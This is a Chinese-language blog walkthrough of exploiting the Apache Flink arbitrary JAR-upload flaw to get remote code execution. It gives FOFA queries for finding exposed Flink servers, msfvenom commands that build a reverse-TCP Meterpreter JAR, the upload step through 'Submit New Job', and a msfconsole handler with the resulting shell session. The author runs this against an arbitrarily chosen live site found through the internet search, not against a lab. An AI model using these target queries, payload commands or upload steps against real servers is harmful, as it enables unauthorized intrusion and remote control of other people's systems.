## **0x01 漏洞影响**

从现在 fofa 的搜索量来看，基本也就是国内 Apache Flink 存在1500左右的站点。

![](https://image.3001.net/images/20220421/1650504918_6260b4d6a08ff5b35cf83.png!small)

有安全研究员公开了一个 Apache Flink 的任意 Jar 包上传导致远程代码执行的漏洞；

影响范围：<= 1.9.1（最新版本）；

此次复现就是通过版本 Version: 1.10.0 进行复现利用。

##  **0x02 收集资产**

首先开启万能的 FOFA，让我们搜一波 Apache-Flink 的站 FOFA 语法。

    
    
    app="Apache-Flink"
    app="Apache‐Flink" && country="CN"
    app="Apache‐Flink" && country="CN" && region="HK"

##  **0x03 木马生成**

点几个看看，梦想很丰满，现实很骨干，一连翻了十多页也没有能行的，最后发现马没生成成功。

关于木马生成大佬文章上这么说的，打开MSF 生成一个 jar 木马，

    
    
    msfvenom ‐p java/meterpreter/reverse_tcp LHOST=**.***.59.61  LPORT=4444 ‐f jar > testone.jar

然后怎么弄也没生成成功，后来就去网上去搜搜看看怎么生成。

https://www.freebuf.com/articles/system/95810.html

  

最后结合大佬的语句成功生成了木马：

    
    
    msfvenom --payload="java/meterpreter/reverse_tcp" LHOST=XXX.XXX.XX.23 LPORT=1234 -f jar > test1.jar

![](https://image.3001.net/images/20220421/1650505046_6260b556e805e603e98a0.png!small)

##  **0x04 上传木马**

随便找一个站点进去，点击 Submit New Job，添加文件上传我们的马。

![](https://image.3001.net/images/20220421/1650505082_6260b57a83c916ce5a0f9.png!small)

##  **0x05 反弹shell**

执行 msfconsole 开启 msf 进行监听。

![](https://image.3001.net/images/20220421/1650505135_6260b5afe5a84e354d2c9.png!small)  

    
    
    msf6 > use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp
    payload => java/shell/reverse_tcp
    msf6 exploit(multi/handler) > set lhost XXX. XXX. XXX.23
    lhost => XXX. XXX. XXX.23
    msf6 exploit(multi/handler) > set lport 1234
    lport => 1234
    msf6 exploit(multi/handler) > run

点击我们上传的马，点击 Submit。

![](https://image.3001.net/images/20220421/1650505188_6260b5e4de348003401c9.png!small)

点击后当前页面不应该出现任何反应，出现了则是马没有生成成功。中途从服务器上下载马的时候，不小心双击了一下，然后我的本机就上线了。![](https://image.3001.net/images/20220421/1650505208_6260b5f8b0980add71ad2.png!small)  
书归正转，此时我们已经看到了shell已经反弹成功。![](https://image.3001.net/images/20220421/1650505273_6260b639bfbe7e8a63475.png!small)  

    
    
    [*] Command shell session 2 opened (XXX.XXX.XXX.23:1234 -> XXX.XXX.XXX.39:38535) at 2020-11-12 16:04:29 +0800

出现这个时已经算是成功了，当时觉得他在那一动不动的以为没成功，然后习惯的敲了几下回车，又看了看大佬写的文章发现应该是成功了，激动的心颤抖的手，让我输入
whoami 看看shell有没有，终是皇天不负有心人，反弹 shell 成功！！！

  

